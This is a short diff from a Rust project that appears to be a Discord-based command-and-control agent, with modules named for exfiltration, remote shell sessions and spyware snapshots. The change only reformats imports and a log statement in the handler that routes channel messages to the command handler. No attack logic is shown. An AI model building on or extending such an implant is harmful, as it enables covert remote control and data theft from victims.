@@ -1,5 +1,4 @@
 use crate::{
-    errors::DiscordC2Error,
     commands::exfiltration::exfiltrate::handle_exfiltrate,
     commands::misc::{info, purge::purge_handler},
     commands::shell::{
@@ -8,6 +7,7 @@ use crate::{
         session::{command_handler, session_handler},
     },
     commands::spyware::snapshot::snapshot_handler,
+    errors::DiscordC2Error,
     register_commands, send_agent_check_in,
     utils::agent::get_or_create_agent,
 };
@@ -37,8 +37,17 @@ impl EventHandler for MainHandler {
         if let Some(channel) = agent.get_session_channel() {
             if msg.channel_id == *channel {
                 if !msg.author.bot {
-                    let channel  = msg.channel_id.to_channel(&ctx.http).await.map_err(DiscordC2Error::from).unwrap();
-                    informational!("Recieved message: {} in channel: {}", msg.content, channel.guild().unwrap().name);
+                    let channel = msg
+                        .channel_id
+                        .to_channel(&ctx.http)
+                        .await
+                        .map_err(DiscordC2Error::from)
+                        .unwrap();
+                    informational!(
+                        "Recieved message: {} in channel: {}",
+                        msg.content,
+                        channel.guild().unwrap().name
+                    );
                 }
 
                 command_handler(&ctx, &msg)
